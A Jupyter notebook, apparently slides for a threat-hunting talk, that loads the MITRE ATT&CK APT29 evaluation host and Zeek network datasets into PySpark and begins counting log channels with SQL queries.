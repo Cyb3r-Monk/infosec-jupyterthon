{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](images/FirstSlide.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# ATT&CK - APT29 Evals Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](images/APT29.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](images/WhatIsSpark.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](images/CoreClasses.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](images/CoreClassesToday.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### 1. Importing Python Libraries"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* **pyspark** modules and classes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.sql import SparkSession\n",
    "from pyspark.sql import DataFrame\n",
    "from pyspark.sql.types import *\n",
    "import pyspark.sql.functions as func\n",
    "from pyspark.sql.functions import length, concat ,concat_ws"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "* **Complementary** libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd, numpy as np, networkx as nx\n",
    "import matplotlib.pyplot as plt\n",
    "import requests\n",
    "\n",
    "from openhunt import ossem, descriptiveStatistics as ds, visualizations as vis\n",
    "\n",
    "import warnings\n",
    "warnings.filterwarnings('ignore')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "### 2. Initializing SparkSession"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "spark = SparkSession.builder.getOrCreate()\n",
    "spark.conf.set(\"spark.sql.caseSensitive\", \"true\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### 3. Importing and Reading Datasets: Host and Network"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* **Host** Data - **Day 1**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Archive:  apt29_evals_day1_manual.zip\n",
      "  inflating: apt29_evals_day1_manual_2020-05-01225525.json  \n"
     ]
    }
   ],
   "source": [
    "!unzip datasets/apt29_evals_day1_manual.zip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pyspark.sql.dataframe.DataFrame'>\n",
      "+------------------------+------------------------------------+-------+\n",
      "|@timestamp              |Channel                             |EventID|\n",
      "+------------------------+------------------------------------+-------+\n",
      "|2020-05-02T02:55:26.493Z|Microsoft-Windows-Sysmon/Operational|10     |\n",
      "|2020-05-02T02:55:26.493Z|Microsoft-Windows-Sysmon/Operational|10     |\n",
      "|2020-05-02T02:55:26.493Z|Microsoft-Windows-Sysmon/Operational|10     |\n",
      "|2020-05-02T02:55:26.494Z|Microsoft-Windows-Sysmon/Operational|10     |\n",
      "|2020-05-02T02:55:26.494Z|Microsoft-Windows-Sysmon/Operational|10     |\n",
      "+------------------------+------------------------------------+-------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "host_day1 = spark.read.json('datasets/apt29_evals_day1_manual_2020-05-01225525.json')\n",
    "\n",
    "print(type(host_day1))\n",
    "host_day1.select('@timestamp','Channel','EventID').show(5, truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "* **Host** Data - **Day 2**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Archive:  apt29_evals_day2_manual.zip\n",
      "  inflating: apt29_evals_day2_manual_2020-05-02035409.json  \n"
     ]
    }
   ],
   "source": [
    "!unzip datasets/apt29_evals_day2_manual.zip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pyspark.sql.dataframe.DataFrame'>\n",
      "+------------------------+------------------------------------+-------+\n",
      "|@timestamp              |Channel                             |EventID|\n",
      "+------------------------+------------------------------------+-------+\n",
      "|2020-05-02T07:54:05.402Z|Microsoft-Windows-Sysmon/Operational|13     |\n",
      "|2020-05-02T07:54:05.402Z|Microsoft-Windows-Sysmon/Operational|13     |\n",
      "|2020-05-02T07:54:05.402Z|Microsoft-Windows-Sysmon/Operational|13     |\n",
      "|2020-05-02T07:54:05.402Z|Microsoft-Windows-Sysmon/Operational|12     |\n",
      "|2020-05-02T07:54:05.402Z|Microsoft-Windows-Sysmon/Operational|13     |\n",
      "+------------------------+------------------------------------+-------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "host_day2 = spark.read.json('datasets/apt29_evals_day2_manual_2020-05-02035409.json')\n",
    "\n",
    "print(type(host_day2))\n",
    "host_day2.select('@timestamp','Channel','EventID').show(5, truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "* **Network** data - **Day 1**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>@stream</th>\n",
       "      <th>@system</th>\n",
       "      <th>@proc</th>\n",
       "      <th>ts</th>\n",
       "      <th>uid</th>\n",
       "      <th>id_orig_h</th>\n",
       "      <th>id_orig_p</th>\n",
       "      <th>id_resp_h</th>\n",
       "      <th>id_resp_p</th>\n",
       "      <th>proto</th>\n",
       "      <th>...</th>\n",
       "      <th>is_64bit</th>\n",
       "      <th>uses_aslr</th>\n",
       "      <th>uses_dep</th>\n",
       "      <th>uses_code_integrity</th>\n",
       "      <th>uses_seh</th>\n",
       "      <th>has_import_table</th>\n",
       "      <th>has_export_table</th>\n",
       "      <th>has_cert_table</th>\n",
       "      <th>has_debug_data</th>\n",
       "      <th>section_names</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>conn</td>\n",
       "      <td>bobs.bigwheel.local</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588205e+09</td>\n",
       "      <td>Cvf4XX17hSAgXDdGEd</td>\n",
       "      <td>10.0.1.6</td>\n",
       "      <td>54243.0</td>\n",
       "      <td>10.0.0.4</td>\n",
       "      <td>53.0</td>\n",
       "      <td>udp</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>conn</td>\n",
       "      <td>bobs.bigwheel.local</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588205e+09</td>\n",
       "      <td>CJ21Le4zsTUcyKKi98</td>\n",
       "      <td>10.0.1.6</td>\n",
       "      <td>56880.0</td>\n",
       "      <td>10.0.0.4</td>\n",
       "      <td>445.0</td>\n",
       "      <td>tcp</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>conn</td>\n",
       "      <td>bobs.bigwheel.local</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588205e+09</td>\n",
       "      <td>CnOP7t1eGGHf6LFfuk</td>\n",
       "      <td>10.0.1.6</td>\n",
       "      <td>65108.0</td>\n",
       "      <td>10.0.0.4</td>\n",
       "      <td>53.0</td>\n",
       "      <td>udp</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>conn</td>\n",
       "      <td>bobs.bigwheel.local</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588205e+09</td>\n",
       "      <td>CvxbPE3MuO7boUdSc8</td>\n",
       "      <td>10.0.1.6</td>\n",
       "      <td>138.0</td>\n",
       "      <td>10.0.1.255</td>\n",
       "      <td>138.0</td>\n",
       "      <td>udp</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>conn</td>\n",
       "      <td>bobs.bigwheel.local</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588205e+09</td>\n",
       "      <td>CuRbE21APSQo2qd6rk</td>\n",
       "      <td>10.0.1.6</td>\n",
       "      <td>123.0</td>\n",
       "      <td>10.0.0.4</td>\n",
       "      <td>123.0</td>\n",
       "      <td>udp</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 148 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "  @stream              @system @proc            ts                 uid  \\\n",
       "0    conn  bobs.bigwheel.local  zeek  1.588205e+09  Cvf4XX17hSAgXDdGEd   \n",
       "1    conn  bobs.bigwheel.local  zeek  1.588205e+09  CJ21Le4zsTUcyKKi98   \n",
       "2    conn  bobs.bigwheel.local  zeek  1.588205e+09  CnOP7t1eGGHf6LFfuk   \n",
       "3    conn  bobs.bigwheel.local  zeek  1.588205e+09  CvxbPE3MuO7boUdSc8   \n",
       "4    conn  bobs.bigwheel.local  zeek  1.588205e+09  CuRbE21APSQo2qd6rk   \n",
       "\n",
       "  id_orig_h  id_orig_p   id_resp_h  id_resp_p proto  ... is_64bit  uses_aslr  \\\n",
       "0  10.0.1.6    54243.0    10.0.0.4       53.0   udp  ...      NaN        NaN   \n",
       "1  10.0.1.6    56880.0    10.0.0.4      445.0   tcp  ...      NaN        NaN   \n",
       "2  10.0.1.6    65108.0    10.0.0.4       53.0   udp  ...      NaN        NaN   \n",
       "3  10.0.1.6      138.0  10.0.1.255      138.0   udp  ...      NaN        NaN   \n",
       "4  10.0.1.6      123.0    10.0.0.4      123.0   udp  ...      NaN        NaN   \n",
       "\n",
       "   uses_dep  uses_code_integrity uses_seh  has_import_table has_export_table  \\\n",
       "0       NaN                  NaN      NaN               NaN              NaN   \n",
       "1       NaN                  NaN      NaN               NaN              NaN   \n",
       "2       NaN                  NaN      NaN               NaN              NaN   \n",
       "3       NaN                  NaN      NaN               NaN              NaN   \n",
       "4       NaN                  NaN      NaN               NaN              NaN   \n",
       "\n",
       "   has_cert_table  has_debug_data  section_names  \n",
       "0             NaN             NaN            NaN  \n",
       "1             NaN             NaN            NaN  \n",
       "2             NaN             NaN            NaN  \n",
       "3             NaN             NaN            NaN  \n",
       "4             NaN             NaN            NaN  \n",
       "\n",
       "[5 rows x 148 columns]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "zeekUrl_day1 = 'https://raw.githubusercontent.com/OTRF/detection-hackathon-apt29/master/datasets/day1/zeek/combined_zeek.log'\n",
    "zeekLogs_day1 = requests.get(zeekUrl_day1)\n",
    "zeekDf_day1 = pd.read_json(zeekLogs_day1.text, lines = True)\n",
    "\n",
    "print(type(zeekDf_day1))\n",
    "zeekDf_day1.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Let's convert this **pandas** dataframe into a **spark** dataframe."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "columnsToChangeType_day1= zeekDf_day1.select_dtypes(include=[object]).columns.to_list()\n",
    "dictionary_day1 = {i : 'str' for i in columnsToChangeType_day1}\n",
    "zeekDf_day1 = zeekDf_day1.astype(dictionary_day1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pyspark.sql.dataframe.DataFrame'>\n",
      "+---------+---------+----------+---------+\n",
      "|id_orig_h|id_orig_p|id_resp_h |id_resp_p|\n",
      "+---------+---------+----------+---------+\n",
      "|10.0.1.6 |54243.0  |10.0.0.4  |53.0     |\n",
      "|10.0.1.6 |56880.0  |10.0.0.4  |445.0    |\n",
      "|10.0.1.6 |65108.0  |10.0.0.4  |53.0     |\n",
      "|10.0.1.6 |138.0    |10.0.1.255|138.0    |\n",
      "|10.0.1.6 |123.0    |10.0.0.4  |123.0    |\n",
      "+---------+---------+----------+---------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "zeekSpark_day1 = spark.createDataFrame(zeekDf_day1)\n",
    "\n",
    "print(type(zeekSpark_day1))\n",
    "zeekSpark_day1.select('id_orig_h','id_orig_p','id_resp_h','id_resp_p').show(5, truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "* **Network** data - **Day 2**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>@stream</th>\n",
       "      <th>@system</th>\n",
       "      <th>@proc</th>\n",
       "      <th>ts</th>\n",
       "      <th>ts_delta</th>\n",
       "      <th>peer</th>\n",
       "      <th>gaps</th>\n",
       "      <th>acks</th>\n",
       "      <th>percent_lost</th>\n",
       "      <th>uid</th>\n",
       "      <th>...</th>\n",
       "      <th>certificate_not_valid_before</th>\n",
       "      <th>certificate_not_valid_after</th>\n",
       "      <th>certificate_key_alg</th>\n",
       "      <th>certificate_sig_alg</th>\n",
       "      <th>certificate_key_type</th>\n",
       "      <th>certificate_key_length</th>\n",
       "      <th>certificate_exponent</th>\n",
       "      <th>server_name</th>\n",
       "      <th>next_protocol</th>\n",
       "      <th>san_dns</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>capture_loss</td>\n",
       "      <td>test-nsm</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588318e+09</td>\n",
       "      <td>936.076895</td>\n",
       "      <td>zeek</td>\n",
       "      <td>9.0</td>\n",
       "      <td>1195.0</td>\n",
       "      <td>0.753138</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>capture_loss</td>\n",
       "      <td>test-nsm</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588318e+09</td>\n",
       "      <td>814.636130</td>\n",
       "      <td>zeek</td>\n",
       "      <td>2.0</td>\n",
       "      <td>945.0</td>\n",
       "      <td>0.211640</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>conn</td>\n",
       "      <td>test-nsm</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588317e+09</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>CyLse01Jig9yHofDXc</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>conn</td>\n",
       "      <td>test-nsm</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588317e+09</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>C55VWq1ibAOPBspBn4</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>conn</td>\n",
       "      <td>test-nsm</td>\n",
       "      <td>zeek</td>\n",
       "      <td>1.588317e+09</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>CD0rgw3qZTWQNLB1ik</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 176 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "        @stream   @system @proc            ts    ts_delta  peer  gaps    acks  \\\n",
       "0  capture_loss  test-nsm  zeek  1.588318e+09  936.076895  zeek   9.0  1195.0   \n",
       "1  capture_loss  test-nsm  zeek  1.588318e+09  814.636130  zeek   2.0   945.0   \n",
       "2          conn  test-nsm  zeek  1.588317e+09         NaN   NaN   NaN     NaN   \n",
       "3          conn  test-nsm  zeek  1.588317e+09         NaN   NaN   NaN     NaN   \n",
       "4          conn  test-nsm  zeek  1.588317e+09         NaN   NaN   NaN     NaN   \n",
       "\n",
       "   percent_lost                 uid  ... certificate_not_valid_before  \\\n",
       "0      0.753138                 NaN  ...                          NaN   \n",
       "1      0.211640                 NaN  ...                          NaN   \n",
       "2           NaN  CyLse01Jig9yHofDXc  ...                          NaN   \n",
       "3           NaN  C55VWq1ibAOPBspBn4  ...                          NaN   \n",
       "4           NaN  CD0rgw3qZTWQNLB1ik  ...                          NaN   \n",
       "\n",
       "   certificate_not_valid_after certificate_key_alg  certificate_sig_alg  \\\n",
       "0                          NaN                 NaN                  NaN   \n",
       "1                          NaN                 NaN                  NaN   \n",
       "2                          NaN                 NaN                  NaN   \n",
       "3                          NaN                 NaN                  NaN   \n",
       "4                          NaN                 NaN                  NaN   \n",
       "\n",
       "  certificate_key_type certificate_key_length  certificate_exponent  \\\n",
       "0                  NaN                    NaN                   NaN   \n",
       "1                  NaN                    NaN                   NaN   \n",
       "2                  NaN                    NaN                   NaN   \n",
       "3                  NaN                    NaN                   NaN   \n",
       "4                  NaN                    NaN                   NaN   \n",
       "\n",
       "   server_name  next_protocol san_dns  \n",
       "0          NaN            NaN     NaN  \n",
       "1          NaN            NaN     NaN  \n",
       "2          NaN            NaN     NaN  \n",
       "3          NaN            NaN     NaN  \n",
       "4          NaN            NaN     NaN  \n",
       "\n",
       "[5 rows x 176 columns]"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "zeekUrl_day2 = 'https://raw.githubusercontent.com/OTRF/detection-hackathon-apt29/master/datasets/day2/zeek/combined_zeek.log'\n",
    "zeekLogs_day2 = requests.get(zeekUrl_day2)\n",
    "zeekDf_day2 = pd.read_json(zeekLogs_day2.text, lines = True)\n",
    "\n",
    "print(type(zeekDf_day2))\n",
    "zeekDf_day2.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Let's convert this **pandas** dataframe into a **spark** dataframe."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "columnsToChangeType_day2= zeekDf_day2.select_dtypes(include=[object]).columns.to_list()\n",
    "dictionary_day2 = {i : 'str' for i in columnsToChangeType_day2}\n",
    "zeekDf_day2 = zeekDf_day2.astype(dictionary_day2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pyspark.sql.dataframe.DataFrame'>\n",
      "+---------+---------+---------+---------+\n",
      "|id_orig_h|id_orig_p|id_resp_h|id_resp_p|\n",
      "+---------+---------+---------+---------+\n",
      "|nan      |NaN      |nan      |NaN      |\n",
      "|nan      |NaN      |nan      |NaN      |\n",
      "|10.0.1.5 |55979.0  |10.0.0.4 |53.0     |\n",
      "|10.0.1.5 |56259.0  |10.0.0.4 |53.0     |\n",
      "|10.0.1.5 |64294.0  |10.0.0.4 |53.0     |\n",
      "+---------+---------+---------+---------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "zeekSpark_day2 = spark.createDataFrame(zeekDf_day2)\n",
    "\n",
    "print(type(zeekSpark_day2))\n",
    "zeekSpark_day2.select('id_orig_h','id_orig_p','id_resp_h','id_resp_p').show(5, truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### 4. Creating a Temporary SQL View"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "host_day1.createTempView(\"apt29HostDay1\")\n",
    "host_day2.createTempView(\"apt29HostDay2\")\n",
    "\n",
    "zeekSpark_day1.createTempView(\"apt29NetworkDay1\")\n",
    "zeekSpark_day2.createTempView(\"apt29NetworkDay2\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### 5. Now we are finally ready to start exploring our data!!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](images/AreWeReady.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Let's first check something really basic:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](images/dataType1.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](images/dataType2.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### a) What sources of data do we have for hosts on day 1?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's select all the data for event field **Channel**:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------------------+\n",
      "|Channel                             |\n",
      "+------------------------------------+\n",
      "|Microsoft-Windows-Sysmon/Operational|\n",
      "|Microsoft-Windows-Sysmon/Operational|\n",
      "|Microsoft-Windows-Sysmon/Operational|\n",
      "|Microsoft-Windows-Sysmon/Operational|\n",
      "|Microsoft-Windows-Sysmon/Operational|\n",
      "+------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "channel_host_day1 = spark.sql(\n",
    "    '''\n",
    "SELECT Channel\n",
    "FROM apt29HostDay1\n",
    "                          ''')\n",
    "channel_host_day1.show(5, truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "This is a **Categorical** variable, so a **stack counting** operation would be helpful:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+----------------------------------------+------+\n",
      "|Channel                                 |count |\n",
      "+----------------------------------------+------+\n",
      "|Microsoft-Windows-Sysmon/Operational    |143884|\n",
      "|Security                                |28627 |\n",
      "|security                                |12375 |\n",
      "|Microsoft-Windows-PowerShell/Operational|5694  |\n",
      "|Windows PowerShell                      |5285  |\n",
      "+----------------------------------------+------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "channel_host_day1 = spark.sql(\n",
    "    '''\n",
    "SELECT Channel, count(*) as count\n",
    "FROM apt29HostDay1\n",
    "\n",
    "GROUP BY Channel\n",
    "ORDER BY count DESC\n",
    "                          ''')\n",
    "channel_host_day1.show(5, truncate = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "If you are more a **visual** person :D"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 864x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.barh_chart(channel_host_day1,'count','Channel','Frequency of Channel')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### b) What Sysmon logs do we have for hosts on day 1?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's use the **WHERE** operator to **filter** our dataset:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
